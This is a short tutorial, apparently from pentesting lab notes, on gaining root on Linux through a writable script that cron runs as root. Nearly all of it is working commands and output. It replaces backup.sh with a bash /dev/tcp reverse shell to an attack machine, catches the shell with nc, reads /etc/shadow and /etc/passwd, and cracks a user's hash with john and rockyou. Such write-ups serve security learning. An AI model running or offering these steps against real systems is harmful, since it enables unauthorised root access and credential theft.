# Cron jobs exploits

Become root on Linux using cron jobs: 

1. Find cron jobs from current user that run as root and may be exploited
2. Change the script or program to start a reverse shell as root
3. Listen and wait for it

## Example: Backup script

`ssh` into the target machine and look at `/etc/crontab`:

```text
Last login: Sun Jun 20 10:17:43 2021 from 10.9.2.27
$ cat /etc/crontab
...
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

Karen's backup script and test.py both run as root. Use either.

On the attack machine start a listener:

```text
└─$ nc -lnvp 4444             
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

Change the backup script:

```text
$ ls
backup.sh
$ mv backup.sh backup.sh.old
$ touch backup.sh
$ nano backup.sh
```

Put this code in:

```text
#!/bin/bash

bash -i >& /dev/tcp/<IP address attack machine>/4444 0>&1
```

And make the script executable:

```text
$ chmod +x backup.sh
```

On the attack machine:

```text
└─# nc -lnvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from <target IP address>.
Ncat: Connection from <target IP address>:55932.
bash: cannot set terminal process group (12785): Inappropriate ioctl for device
bash: no job control in this shell
root@target:~# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@target:~# cat /etc/shadow | grep matt
cat /etc/shadow | grep matt
matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::
root@target:~# cat /etc/passwd | grep matt
cat /etc/passwd | grep matt
matt:x:1002:1002::/home/matt:/bin/sh
```

On the attack machine, copy matt's shadow in `shadow.txt` and matt's password in `password.txt`. 

```text
$ unshadow passwd.txt shadow.txt > crackmatt.txt

$ john --wordlist=/usr/share/wordlists/rockyou.txt crackmatt.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (matt)     
1g 0:00:00:00 DONE (2022-09-25 23:30) 3.225g/s 3303p/s 3303c/s 3303C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Notes

Not really exploit usage, but based on files with incorrectly installed authorities. 